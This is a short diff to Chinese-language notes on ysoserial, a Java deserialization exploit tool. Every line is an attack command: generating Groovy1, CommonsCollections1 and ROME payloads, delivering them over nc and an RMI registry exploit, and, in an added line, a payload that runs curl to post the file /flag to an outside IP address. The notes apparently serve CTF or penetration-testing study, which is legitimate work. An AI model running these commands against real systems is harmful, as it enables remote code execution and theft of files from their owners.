@@ -10,10 +10,12 @@ java -jar ysoserial.jar [payload] '[command]'
 ```
 案例：
 ```
-$ java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
-$ nc 10.10.10.10 1099 < groovypayload.bin
+java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
+nc 10.10.10.10 1099 < groovypayload.bin
 
-$ java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe
+java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe
+
+java -jar ysoserial.jar ROME "curl http://1.2.90.186:1234 -d @/flag" |base64
 ```
 
 ^
